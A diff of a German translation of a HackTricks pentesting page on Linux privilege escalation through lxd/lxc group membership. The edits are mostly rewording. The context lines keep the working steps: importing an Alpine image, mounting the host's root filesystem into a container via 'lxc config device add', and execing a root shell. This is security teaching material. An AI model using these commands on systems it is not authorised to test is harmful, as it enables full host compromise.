@@ -2,17 +2,17 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Wenn du zur _**lxd**_- oder _**lxc**_-**Group** gehörst, kannst du zu root werden
+Wenn du zur _**lxd**_- oder _**lxc**_-**group** gehörst, kannst du zu root werden
 
 ## Exploiting ohne Internet
 
 ### Method 1
 
-Du kannst ein Alpine-Image aus einem vertrauenswürdigen Repository herunterladen, das du mit lxd verwendest.
+Du kannst ein alpine image zur Verwendung mit lxd aus einem vertrauenswürdigen Repository herunterladen.
 Canonical veröffentlicht tägliche Builds auf seiner Website: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
-Lade einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter. (Der Verzeichnisname ist das Datum.)
+Lade einfach sowohl **lxd.tar.xz** als auch **rootfs.squashfs** aus dem neuesten Build herunter. (Der Verzeichnisname ist das Datum).
 
-Alternativ kannst du diesen Distrobuilder auf deinem Computer installieren: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (folge den Anweisungen auf GitHub):
+Alternativ kannst du diesen distro builder auf deiner Maschine installieren: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (folge den Anweisungen auf GitHub):
 ```bash
 # Install requirements
 sudo apt update
@@ -35,7 +35,7 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 # Create the container - Beware of architecture while compiling locally.
 sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-Lade die Dateien **incus.tar.xz** (**lxd.tar.xz**, wenn du sie aus dem Canonical-Repository heruntergeladen hast) und **rootfs.squashfs** hoch, füge das Image zum Repo hinzu und erstelle einen Container:
+Lade die Dateien **incus.tar.xz** (**lxd.tar.xz**, wenn du sie aus dem Canonical repository heruntergeladen hast) hoch, füge das Image zum Repo hinzu und erstelle einen Container:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -51,10 +51,10 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> Wenn dieser Fehler _**Error: No storage pool found. Please create a new storage pool**_ auftritt,\
-> führe **`lxd init`** aus und übernimm für alle Optionen die Standardwerte. Wiederhole anschließend den vorherigen Befehlsblock.
+> Wenn du auf diesen Fehler _**Error: No storage pool found. Please create a new storage pool**_ stößt,\
+> führe **`lxd init`** aus und belasse alle Optionen auf den Standardwerten. **Führe anschließend den vorherigen Befehlsblock erneut aus.**
 
-Finally kannst du den Container ausführen und erhältst root:
+Schließlich kannst du den Container ausführen und root erhalten:
 ```bash
 lxc start privesc
 lxc exec privesc /bin/sh
